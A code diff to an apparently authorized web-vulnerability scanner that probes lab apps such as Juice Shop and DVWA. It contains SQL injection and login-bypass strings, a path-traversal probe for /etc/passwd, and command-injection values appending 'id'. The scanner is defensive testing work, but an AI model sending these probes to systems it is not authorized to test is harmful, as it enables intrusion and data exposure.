@@ -1,4 +1,5 @@
 import type { Severity } from "../events/types.js";
+import type { GraphQLProbe } from "../recon/index.js";
 import type { Session, SessionRequest, SessionResponse } from "../session/index.js";
 import { type Artifact, type AttackContext, latestArtifact, type SeedStep } from "./context.js";
 
@@ -12,6 +13,9 @@ export interface AttemptResult {
   /** Whether the technique even applies here (false on 404 / hard block). */
   applicable?: boolean;
   evidence?: { request: string; response: string; note?: string };
+  /** Overrides the class default basis when THIS attempt confirmed differently
+   *  (e.g. an impact-confirmed boolean dump vs. the class's signal default). */
+  basis?: string;
   /** Artifacts this step discovered, fed into the world-model for later steps. */
   discovered?: Artifact[];
   /** Follow-up steps this confirmation seeds — the chain grows from here. */
@@ -27,6 +31,17 @@ export interface AttemptOpts {
   useSession: boolean;
   /** The specific in-scope URL this attempt targets. */
   url: string;
+  /** HTTP method of the targeted endpoint, when recon recorded a form. */
+  method?: "GET" | "POST";
+  /** Named injectable form fields recon captured, for a form-aware probe. */
+  fields?: string[];
+  /** Every named control with its default value, to resubmit the complete form. */
+  formData?: Record<string, string>;
+  /** A GraphQL Query-field argument to inject into, when this is a GraphQL endpoint. */
+  graphql?: GraphQLProbe;
+  /** The session carries operator-provided credentials (an authenticated run).
+   *  Reaching an authorized resource is then expected, not broken access. */
+  authenticated?: boolean;
   /** Lowercased tokens from the objective used as a generic success signal. */
   objectiveHint?: string[];
   /** The run's world-model — artifacts earlier steps discovered. */
@@ -273,10 +288,20 @@ export function findingProfile(technique: string, cve?: string): FindingProfile 
 
 type Base = { status: number; evidence: { request: string; response: string } };
 
+/**
+ * Upper bound on the response body a signal check scans. Detection must read the
+ * whole page, not a head slice: a large app wraps its real output in a big nav/
+ * framework shell, so a reflected marker, command output or leaked file lands far
+ * below the fold (Mutillidae reflects DNS-lookup output ~49 KB into a 52 KB page).
+ * A head-only scan is a silent false negative that scales with page size, not with
+ * the vuln. Kept finite so a pathological multi-MB body can't stall a regex.
+ */
+const DETECT_MAX = 512_000;
+
 /** A sent request, already classified against the stable transport contract. */
 type Sent =
   | { kind: "result"; result: AttemptResult }
-  | { kind: "ok"; res: SessionResponse; snippet: string; base: Base };
+  | { kind: "ok"; res: SessionResponse; snippet: string; scan: string; base: Base };
 
 /**
  * Perform one gated request, applying only the transport/scope contract. The
@@ -304,8 +329,9 @@ async function rawSend(session: Session, req: SessionRequest, label?: string): P
   }
 
   const snippet = res.body.slice(0, 2000);
+  const scan = res.body.length <= DETECT_MAX ? res.body : res.body.slice(0, DETECT_MAX);
   const base = { status: res.status, evidence: { request, response: snippet } };
-  return { kind: "ok", res, snippet, base };
+  return { kind: "ok", res, snippet, scan, base };
 }
 
 /** The stable status contract: 5xx → transient, 404/405 → not applicable. */
@@ -359,6 +385,45 @@ function isRoot(url: string): boolean {
   }
 }
 
+// An inherently-public authentication-entry page — login, registration, password
+// recovery. Authorization is never expected on these, so serving one to an
+// anonymous caller is correct behavior, NOT broken access control. Matched by URL
+// path (not body), so a snippet that truncates before the login form — leaving
+// only a <title> that happens to echo a generic objective word like
+// "application" — can never be mistaken for a reached objective. This closes the
+// false "Impact-confirmed BAC" the DVNA cross-lab run surfaced on /login,
+// /register, and /forgotpw. See COLD_RUN.md.
+const PUBLIC_AUTH_PATH =
+  /(?:^|\/)(?:log[-_]?in|sign[-_]?in|sign[-_]?up|register|registration|forgot(?:[-_]?pw|[-_]?password)?|reset(?:[-_]?pw|[-_]?password)?|password\/(?:forgot|reset))\/?$/i;
+
+function isPublicAuthEntry(url: string): boolean {
+  try {
+    return PUBLIC_AUTH_PATH.test(new URL(url).pathname);
+  } catch {
+    return false;
+  }
+}
+
+// A privilege-denoting surface: an administrative, management, or configuration
+// area a normal or anonymous principal should not reach. Broken access control is
+// confirmed only when a surface like this is served without proper authorization —
+// NOT merely because some reachable page echoes an objective word. A public
+// catalog, search, contact, or login page is not broken access control, and
+// flagging every such page was a systematic false positive a multi-lab run
+// surfaced (BodgeIt, VAmPI, bWAPP). Matched on the URL (path + query) so page
+// chrome — a nav "Admin" link on every page — cannot trip it.
+const PRIVILEGED_SURFACE =
+  /(?:^|[/._?&=-])(?:admin|administrator|superuser|manage|management|console|config|configuration|internal|dashboard|privileg)/i;
+
+function isPrivilegedSurface(url: string): boolean {
+  try {
+    const u = new URL(url);
+    return PRIVILEGED_SURFACE.test(u.pathname + u.search);
+  } catch {
+    return false;
+  }
+}
+
 // Lab-specific surfaces for the authorized first target (OWASP Juice Shop).
 // This file is the one deliberately lab-specific surface (see the header), so
 // the known endpoints live here. A hypothesis candidate reaches `attempt` with
@@ -382,8 +447,17 @@ function surfaceFor(url: string, path: string): string {
 
 // --- per-technique checks --------------------------------------------------
 
+// A LEAKED DATABASE ERROR — an actual engine/driver error signature, not the
+// topic word "SQL". The bare word matched any page that merely *mentions* SQL — a
+// nav link reading "SQL Injection", a security-teaching app's lesson titles
+// ("1.sql.injection.title") — which, scanned in a rendered SPA DOM, produced a
+// critical false positive on WebGoat. Each alternative below is text a database or
+// its driver emits on a parse/execution failure (MySQL/MariaDB, SQLite, Postgres,
+// Oracle, SQL Server, and Python/Java driver exception classes), so the signal is
+// the error, not the subject. A benign-control differential (signalIsPayloadCaused)
+// backs this up: even a matched string must be absent from an ordinary request.
 const SQL_ERROR =
-  /\bsql(ite)?(3)?\b|SQLITE_ERROR|syntax error|unterminated|ORA-\d{3,}|psql:|postgres|mysql_fetch|near ["']|unrecognized token|no such column/i;
+  /error in your (?:sql|mysql) syntax|warning:\s*(?:mysqli?|pg|oci8?|sqlsrv|sqlite)_|mysqli?_(?:fetch|num_rows|query)|supplied argument is not a valid mysql|unterminated quoted string|quoted string not properly terminated|unclosed quotation mark|ORA-\d{3,}|SQLSTATE\[|SQLITE_ERROR|(?:sqlite3?|sqlalchemy|psycopg2?)[.\w]*error|\b(?:operational|programming|integrity)error\b|org\.postgresql|org\.h2\.|com\.mysql|psql:|unrecognized token|no such column|near ["']|syntax error at or near|incorrect syntax near/i;
 
 // A framework/version banner leaked on an error page — e.g. Juice Shop's 500
 // page titled "OWASP Juice Shop (Express ^4.22.1)". The parenthetical names the
@@ -410,35 +484,266 @@ function bannerArtifact(snippet: string, from: string): Artifact | undefined {
  * often rides a 5xx, so this check reads the body BEFORE the status contract —
  * a DB error in a 500 is a confirmed finding here, not a transient failure.
  */
+const SQLI_TAUTOLOGY = "' OR '1'='1";
+const SQLI_FALSE = "' AND '1'='2";
+
+/**
+ * A proxy for "how many records did this query return" — HTML table rows, or, for
+ * a JSON response, record objects. Static page chrome (CSS/JS braces) is NOT
+ * counted: JSON objects are tallied only when the body is actually JSON, so a
+ * boolean oracle compares data rows, not a page's styling.
+ */
+function resultShape(body: string): number {
+  const rows = (body.match(/<tr\b/gi) ?? []).length;
+  const cells = (body.match(/<td\b/gi) ?? []).length;
+  const trimmed = body.trimStart();
+  const isJson = trimmed.startsWith("[") || trimmed.startsWith("{");
+  const jsonObjs = isJson ? (body.match(/\{[^{}]*"[^{}]*\}/g) ?? []).length : 0;
+  return Math.max(rows, Math.floor(cells / 2), jsonObjs);
+}
+
+/**
+ * Build a gated request that places `value` at an endpoint's injectable input: a
+ * POST into a named form field, a GET into a named field or the endpoint's own
+ * query parameter, or — with nothing else to go on — the conventional `q` on the
+ * known search surface (the first target's shape).
+ */
+function injectionRequest(
+  opts: AttemptOpts,
+  field: string | undefined,
+  value: string,
+  defaultKey = "q",
+): { req: SessionRequest; label: string } {
+  // A GraphQL Query-field argument: build `{ field(fixedArgs arg: "payload") sel }`
+  // and POST it as a query (never a mutation — read semantics). The payload is
+  // escaped as a GraphQL string literal via JSON string escaping.
+  if (opts.graphql) {
+    const g = opts.graphql;
+    const literal = JSON.stringify(value).slice(1, -1);
+    const query = `{ ${g.field}(${g.fixedArgs}${g.arg}: "${literal}")${g.selection} }`;
+    return {
+      req: {
+        url: opts.url,
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ query }),
+      },
+      label: `POST ${opts.url}  graphql ${g.field}(${g.arg})`,
+    };
+  }
+  // An OpenAPI path parameter ({username}) is injected by substituting the payload
+  // into that path segment, with any other template filled by a benign placeholder
+  // so the route still resolves. This is always a GET (read semantics).
+  if (field && opts.url.includes(`{${field}}`)) {
+    const injected = opts.url
+      .replace(`{${field}}`, encodeURIComponent(value))
+      .replace(/\{[^}]+\}/g, "1");
+    return { req: { url: injected }, label: `GET ${injected}` };
+  }
+  if (opts.method === "POST" && field) {
+    // Resubmit the complete form (submit button + sibling fields at their defaults)
+    // with the target field replaced, so an app that gates on a submit/sibling field
+    // actually processes the request. Falls back to the lone field when nothing else
+    // was captured.
+    const params = new URLSearchParams(opts.formData ?? {});
+    params.set(field, value);
+    return {
+      req: {
+        url: opts.url,
+        method: "POST",
+        headers: { "content-type": "application/x-www-form-urlencoded" },
+        body: params.toString(),
+      },
+      label: `POST ${opts.url}  ${field}=${value}`,
+    };
+  }
+  // A GET form with other controls (e.g. DVWA's `?id=…&Submit=Submit`): resubmit the
+  // whole form in the query string with the target field replaced.
+  if (field && opts.formData && Object.keys(opts.formData).length > 1) {
+    try {
+      const u = new URL(opts.url);
+      for (const [k, v] of Object.entries(opts.formData)) if (k !== field) u.searchParams.set(k, v);
+      u.searchParams.set(field, value);
+      return { req: { url: u.toString() }, label: `GET ${u.toString()}` };
+    } catch {
+      /* fall through to single-param injection */
+    }
+  }
+  let url = opts.url;
+  let key = defaultKey;
+  if (field) {
+    key = field;
+  } else {
+    try {
+      const existing = [...new URL(opts.url).searchParams.keys()][0];
+      if (existing) key = existing;
+      else url = surfaceFor(opts.url, SEARCH_SURFACE);
+    } catch {
+      url = surfaceFor(opts.url, SEARCH_SURFACE);
+    }
+  }
+  const injected = withParam(url, key, value);
+  return { req: { url: injected }, label: `GET ${injected}` };
+}
+
+// A surface whose name denotes a STATE CHANGE — create/update/delete, uploads,
+// checkout, registration. An injection probe reaches these by POST, and POSTing a
+// payload into a mutating form writes to the target. That crosses the read-only
+// line the safety model draws (SAFETY.md §4), so we never inject into one. A GET
+// carries read semantics and is always allowed; the guard only gates POST.
+const MUTATING_HINT =
+  /(?:create|update|delete|destroy|remove|save|edit|modify|upload|checkout|order|\bbuy\b|\bpay\b|transfer|insert|import|\badd\b|\bnew\b)/i;
+
+function isMutatingSurface(opts: AttemptOpts): boolean {
+  if (opts.method !== "POST") return false;
+  try {
+    if (MUTATING_HINT.test(new URL(opts.url).pathname)) return true;
+  } catch {
+    /* fall through to field check */
+  }
+  return (opts.fields ?? []).some((f) => MUTATING_HINT.test(f));
+}
+
+// The parameters/fields to probe on this endpoint, bounded so a wide form never
+// explodes the step budget. A POST form → its own fields only (its query string is
+// routing, not a body input). A GET → the UNION of its captured fields and its
+// existing query parameters: a page can carry both an injectable form field (a
+// search box) and an injectable router/query param (the LFI-prone `?page=` of a
+// router app, or a spec-declared query param), and probing only one masks the
+// other. Nothing to go on → a single undefined target, which falls back to the
+// conventional key on the search surface (the first target's shape).
+function candidateFields(opts: AttemptOpts): Array<string | undefined> {
+  if (opts.graphql) return [`${opts.graphql.field}.${opts.graphql.arg}`];
+  const fields = opts.fields ?? [];
+  if (opts.method === "POST") return fields.length > 0 ? fields.slice(0, 3) : [undefined];
+  const out: Array<string | undefined> = [...fields];
+  try {
+    for (const k of new URL(opts.url).searchParams.keys()) {
+      if (!out.includes(k)) out.push(k);
+    }
+  } catch {
+    /* fall through */
+  }
+  if (out.length === 0) return [undefined];
+  return out.slice(0, 3);
+}
+
+/** A read-only probe that would have to POST into a mutating form is skipped. */
+function mutatingSkip(technique: string): AttemptResult {
+  return {
+    ok: false,
+    applicable: false,
+    note: `${technique}: target is a state-changing form — skipped to stay read-only`,
+  };
+}
+
+/**
+ * Control differential for a PRESENCE-based signal (a leaked DB error, host-file
+ * contents, shell output). The same input is re-sent with a BENIGN value, and the
+ * signal counts only if it is ABSENT from that control response. A presence signal
+ * proves injection only when it appears in reaction to the payload and NOT in an
+ * ordinary request; otherwise the "signal" is the application's own content — a
+ * security-teaching app's lesson text, a nav menu naming "SQL Injection", an example
+ * `/etc/passwd` printed on the page — which is there regardless of input. This is the
+ * precision backstop that caught the WebGoat critical false positive, where
+ * `start.mvc` returned byte-identical content for the payload and a benign value. If
+ * the control cannot be fetched cleanly we do not let a transient failure suppress a
+ * real finding: the payload signal stands.
+ */
+async function signalIsPayloadCaused(
+  session: Session,
+  opts: AttemptOpts,
+  field: string | undefined,
+  benign: string,
+  pattern: RegExp,
+  defaultKey = "q",
+): Promise<boolean> {
+  const { req, label } = injectionRequest(opts, field, benign, defaultKey);
+  const sent = await rawSend(session, req, label);
+  if (sent.kind !== "ok") return true;
+  return !pattern.test(sent.scan);
+}
+
+/** A benign control value: alphanumeric, no quote/metacharacter, won't trip a sink. */
+function benignControlValue(): string {
+  return `nf${Math.random().toString(36).slice(2, 8)}`;
+}
+
 async function sqlInjectionCheck(
   session: Session,
   technique: string,
   opts: AttemptOpts,
 ): Promise<AttemptResult> {
-  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "q", `'"`);
-  const sent = await rawSend(session, { url }, `GET ${url}`);
-  if (sent.kind === "result") return sent.result;
-  const { res, snippet, base } = sent;
+  if (isMutatingSurface(opts)) return mutatingSkip(technique);
+  let last: AttemptResult | undefined;
 
-  if (SQL_ERROR.test(snippet)) {
-    const banner = bannerArtifact(snippet, technique);
-    return {
-      ok: true,
-      note: `${technique}: DB error surfaced by a quote probe (error-based SQLi signal)`,
+  for (const field of candidateFields(opts)) {
+    // 1) Error-based: an unmatched quote-pair should trip a DB parse error that
+    //    leaks the engine (and often a framework banner).
+    const quote = injectionRequest(opts, field, `'"`);
+    const sent = await rawSend(session, quote.req, quote.label);
+    if (sent.kind === "result") {
+      last = sent.result;
+      continue;
+    }
+    const { res, scan, base } = sent;
+
+    if (
+      SQL_ERROR.test(scan) &&
+      (await signalIsPayloadCaused(session, opts, field, benignControlValue(), SQL_ERROR))
+    ) {
+      const banner = bannerArtifact(scan, technique);
+      return {
+        ok: true,
+        note: `${technique}: DB error surfaced by a quote probe on '${field ?? "q"}' and absent from a benign control (error-based SQLi signal)`,
+        applicable: true,
+        ...(banner ? { discovered: [banner] } : {}),
+        ...base,
+      };
+    }
+
+    // 2) Boolean-based: an app can swallow the engine error (a generic 500 or
+    //    "Internal Error" page) yet still build the query by concatenation. Two
+    //    payloads that differ ONLY in a boolean — an always-false `AND '1'='2` and
+    //    an always-true `OR '1'='1` — then return different result sets, while an
+    //    uninjectable endpoint returns the same for both. More rows under the true
+    //    condition is the classic oracle: injected logic changed the query. This is
+    //    SELECT-side only — it reads rows, it writes nothing.
+    const marker = `nf${Math.random().toString(36).slice(2, 8)}`;
+    const falseInj = injectionRequest(opts, field, `${marker}${SQLI_FALSE}`);
+    const trueInj = injectionRequest(opts, field, `${marker}${SQLI_TAUTOLOGY}`);
+    const falseRes = await rawSend(session, falseInj.req);
+    const trueRes = await rawSend(session, trueInj.req, trueInj.label);
+    if (falseRes.kind === "ok" && trueRes.kind === "ok") {
+      const falseRows = resultShape(falseRes.res.body);
+      const trueRows = resultShape(trueRes.res.body);
+      if (trueRows > falseRows && trueRows >= 1) {
+        return {
+          ok: true,
+          note: `${technique}: always-true condition returned ${trueRows} record(s) vs ${falseRows} for always-false on '${field ?? "q"}' — boolean-based SQLi`,
+          applicable: true,
+          basis:
+            "Impact-confirmed: two requests differing only in a boolean (' OR '1'='1 vs ' AND '1'='2) returned different result sets, so the injected logic actually altered the query and read rows unauthorized. The probe injects SELECT-side logic only — it reads, it writes nothing.",
+          evidence: {
+            request: trueInj.label,
+            response: trueRes.snippet,
+            note: `always-false → ${falseRows} record-rows; always-true → ${trueRows}`,
+          },
+          status: trueRes.res.status,
+        };
+      }
+    }
+
+    // No signal on this field: remember the stable status contract and move on.
+    last = statusResult(res, base) ?? {
+      ok: false,
+      note: `${technique}: no DB error or boolean differential`,
       applicable: true,
-      ...(banner ? { discovered: [banner] } : {}),
       ...base,
     };
   }
-  // No signal: fall back to the stable status contract (5xx transient, 404 n/a).
-  return (
-    statusResult(res, base) ?? {
-      ok: false,
-      note: `${technique}: no DB error from quote probe`,
-      applicable: true,
-      ...base,
-    }
-  );
+
+  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
 }
 
 // A benign reflection marker. The angle brackets are the signal: if they come
@@ -455,27 +760,34 @@ async function xssCheck(
   technique: string,
   opts: AttemptOpts,
 ): Promise<AttemptResult> {
-  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "q", XSS_MARKER);
-  const sent = await send(session, { url }, `GET ${url}`);
-  if (sent.kind === "result") return sent.result;
-  const { res, snippet, base } = sent;
-
-  const ctype = (res.headers["content-type"] ?? res.headers["Content-Type"] ?? "").toLowerCase();
-  const isHtml = ctype.includes("html") || snippet.trimStart().startsWith("<");
-  if (isHtml && snippet.includes(XSS_MARKER)) {
-    return {
-      ok: true,
-      note: `${technique}: marker reflected un-escaped into HTML (reflected-XSS signal)`,
+  if (isMutatingSurface(opts)) return mutatingSkip(technique);
+  let last: AttemptResult | undefined;
+  for (const field of candidateFields(opts)) {
+    const { req, label } = injectionRequest(opts, field, XSS_MARKER);
+    const sent = await send(session, req, label);
+    if (sent.kind === "result") {
+      last = sent.result;
+      continue;
+    }
+    const { res, snippet, scan, base } = sent;
+    const ctype = (res.headers["content-type"] ?? res.headers["Content-Type"] ?? "").toLowerCase();
+    const isHtml = ctype.includes("html") || snippet.trimStart().startsWith("<");
+    if (isHtml && scan.includes(XSS_MARKER)) {
+      return {
+        ok: true,
+        note: `${technique}: marker reflected un-escaped into HTML via '${field ?? "q"}' (reflected-XSS signal)`,
+        applicable: true,
+        ...base,
+      };
+    }
+    last = {
+      ok: false,
+      note: `${technique}: marker not reflected un-escaped`,
       applicable: true,
       ...base,
     };
   }
-  return {
-    ok: false,
-    note: `${technique}: marker not reflected un-escaped`,
-    applicable: true,
-    ...base,
-  };
+  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
 }
 
 /**
@@ -490,13 +802,13 @@ async function csrfCheck(
 ): Promise<AttemptResult> {
   const sent = await send(session, { url: opts.url });
   if (sent.kind === "result") return sent.result;
-  const { res, snippet, base } = sent;
+  const { res, scan, base } = sent;
 
   const setCookie = (res.headers["set-cookie"] ?? res.headers["Set-Cookie"] ?? "").toLowerCase();
   const hasSession = /sess|sid|token|auth|connect\.sid/.test(setCookie);
   const sameSite = setCookie.includes("samesite");
   const hasAntiCsrf =
-    /csrf|xsrf/i.test(JSON.stringify(res.headers)) || /csrf|xsrf|_token/i.test(snippet);
+    /csrf|xsrf/i.test(JSON.stringify(res.headers)) || /csrf|xsrf|_token/i.test(scan);
 
   if (hasSession && !sameSite && !hasAntiCsrf) {
     return {
@@ -527,59 +839,100 @@ async function pathTraversalCheck(
   technique: string,
   opts: AttemptOpts,
 ): Promise<AttemptResult> {
-  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "file", "../../../../etc/passwd");
-  const sent = await send(session, { url }, `GET ${url}`);
-  if (sent.kind === "result") return sent.result;
-  const { snippet, base } = sent;
-
-  if (TRAVERSAL_HIT.test(snippet)) {
-    return {
-      ok: true,
-      note: `${technique}: host file contents leaked via dot-dot sequence (path-traversal signal)`,
+  if (isMutatingSurface(opts)) return mutatingSkip(technique);
+  let last: AttemptResult | undefined;
+  for (const field of candidateFields(opts)) {
+    const { req, label } = injectionRequest(opts, field, "../../../../etc/passwd", "file");
+    const sent = await send(session, req, label);
+    if (sent.kind === "result") {
+      last = sent.result;
+      continue;
+    }
+    const { scan, base } = sent;
+    if (
+      TRAVERSAL_HIT.test(scan) &&
+      (await signalIsPayloadCaused(
+        session,
+        opts,
+        field,
+        benignControlValue(),
+        TRAVERSAL_HIT,
+        "file",
+      ))
+    ) {
+      return {
+        ok: true,
+        note: `${technique}: host file contents leaked via '${field ?? "file"}' dot-dot sequence and absent from a benign control (path-traversal signal)`,
+        applicable: true,
+        ...base,
+      };
+    }
+    last = {
+      ok: false,
+      note: `${technique}: no file contents leaked`,
       applicable: true,
       ...base,
     };
   }
-  return {
-    ok: false,
-    note: `${technique}: no file contents leaked`,
-    applicable: true,
-    ...base,
-  };
+  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
 }
 
 const CMD_OUTPUT = /uid=\d+\(.*?\)\s+gid=\d+\(|total \d+\s+drwx|root:[x*]?:0:0:/i;
 
 /**
+ * Separator probes, each benign-prefixed with a routable host. The prefix matters:
+ * a bare `; id` leaves a host-expecting command (ping/nslookup/dig/host) with no
+ * argument, and some of those block on an empty arg until the request times out —
+ * the inert `id` then never runs and a real flaw reads as a plain negative. A valid
+ * host lets the first command return promptly, so the appended `id` runs regardless
+ * of the sink. Two separators cover the common shell contexts (`;` always runs the
+ * second command; `|` runs it even when the first fails, as a non-host sink does).
+ */
+const CMD_PAYLOADS = ["127.0.0.1; id", "127.0.0.1 | id"];
+
+/**
  * Command injection — the most invasive class, kept deliberately conservative:
- * a benign, inert separator probe (`;id`) and a check for shell-output
- * signatures. It confirms only on clear evidence and otherwise reports a plain
- * negative — no destructive payloads, no blind time-based escalation.
+ * benign, inert separator probes (append `id`, read nothing destructive) and a
+ * check for shell-output signatures. It confirms only on clear evidence and
+ * otherwise reports a plain negative — no destructive payloads, no blind
+ * time-based escalation.
  */
 async function commandInjectionCheck(
   session: Session,
   technique: string,
   opts: AttemptOpts,
 ): Promise<AttemptResult> {
-  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "q", "; id");
-  const sent = await send(session, { url }, `GET ${url}`);
-  if (sent.kind === "result") return sent.result;
-  const { snippet, base } = sent;
-
-  if (CMD_OUTPUT.test(snippet)) {
-    return {
-      ok: true,
-      note: `${technique}: shell command output observed (command-injection signal)`,
-      applicable: true,
-      ...base,
-    };
+  if (isMutatingSurface(opts)) return mutatingSkip(technique);
+  let last: AttemptResult | undefined;
+  for (const field of candidateFields(opts)) {
+    for (const payload of CMD_PAYLOADS) {
+      const { req, label } = injectionRequest(opts, field, payload);
+      const sent = await send(session, req, label);
+      if (sent.kind === "result") {
+        last = sent.result;
+        continue;
+      }
+      const { scan, base } = sent;
+      if (
+        CMD_OUTPUT.test(scan) &&
+        (await signalIsPayloadCaused(session, opts, field, "127.0.0.1", CMD_OUTPUT))
+      ) {
+        return {
+          ok: true,
+          note: `${technique}: shell command output observed via '${field ?? "q"}' and absent from a benign control (command-injection signal)`,
+          applicable: true,
+          ...base,
+        };
+      }
+      last = {
+        ok: false,
+        note: `${technique}: no command output observed`,
+        applicable: true,
+        ...base,
+      };
+    }
   }
-  return {
-    ok: false,
-    note: `${technique}: no command output observed`,
-    applicable: true,
-    ...base,
-  };
+  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
 }
 
 // An auth wall: a 401/403, or a login page a dropped/expired session was
@@ -664,6 +1017,30 @@ async function accessControlCheck(
   steer: boolean,
 ): Promise<AttemptResult> {
   const hint = opts.objectiveHint ?? [];
+  // On an authenticated run (operator credentials), reaching a resource the
+  // principal is authorized for is expected — not broken access control. With no
+  // lower-privilege baseline to compare against, a reachable+keyword match can't
+  // soundly prove a boundary violation, so we under-claim rather than flag every
+  // authenticated feature page. (Unauthenticated BAC confirmation is unaffected:
+  // reaching a gated surface with no session remains a finding.)
+  if (opts.authenticated) {
+    return {
+      ok: false,
+      applicable: true,
+      note: `${technique}: authenticated principal reaching an authorized resource — not broken access control (no lower-privilege baseline)`,
+    };
+  }
+  // A public authentication-entry page (login/register/password-recovery) is
+  // served to anonymous callers by design — authorization is not expected there,
+  // so it can never be a broken-access-control finding, whatever objective words
+  // its chrome echoes. Guarded by URL so a truncated body can't defeat it.
+  if (isPublicAuthEntry(opts.url)) {
+    return {
+      ok: false,
+      applicable: true,
+      note: `${technique}: ${opts.url} is a public auth-entry surface — authorization not expected, not broken access`,
+    };
+  }
   // An unrecognized technique handed only the site root has no specific surface
   // to prove anything against — an objective word appearing on the landing page
   // is not evidence of broken access, so it must not confirm there.
@@ -675,9 +1052,24 @@ async function accessControlCheck(
     };
   }
   const direct = await probeObjective(session, technique, opts.url, hint);
+  // A reachable page that echoes an objective word is only broken access control
+  // when the surface itself is privilege-denoting (admin/config/management). A
+  // public catalog/search/contact page is reachable by design — confirming it is
+  // the systematic false positive a multi-lab run exposed. We down-grade such a
+  // hit to "reachable, not a finding" rather than emit a wrong "Impact-confirmed".
+  if (direct.ok && !isPrivilegedSurface(opts.url)) {
+    return {
+      ok: false,
+      applicable: true,
+      status: direct.status,
+      ...(direct.evidence ? { evidence: direct.evidence } : {}),
+      note: `${technique}: reachable (${direct.status ?? 200}) but not a privilege-denoting surface — public or authorized access is not broken access control`,
+    };
+  }
   if (direct.ok || !steer || !isRoot(opts.url)) return direct;
 
   // Root with no signal: try the known broken-access surface before giving up.
+  // That surface is administrative by construction, so it needs no extra gate.
   const admin = surfaceFor(opts.url, ADMIN_CONFIG_SURFACE);
   if (admin === opts.url) return direct;
   const viaAdmin = await probeObjective(session, technique, admin, hint);
@@ -725,9 +1117,9 @@ async function authBypassCheck(
     `POST ${url}  {"email":"' OR 1=1--","password":"x"}`,
   );
   if (sent.kind === "result") return sent.result;
-  const { res, snippet, base } = sent;
+  const { res, snippet, scan, base } = sent;
 
-  const m = snippet.match(TOKEN_RE);
+  const m = scan.match(TOKEN_RE);
   if (res.status < 400 && m?.[1]) {
     const token = m[1];
     return {
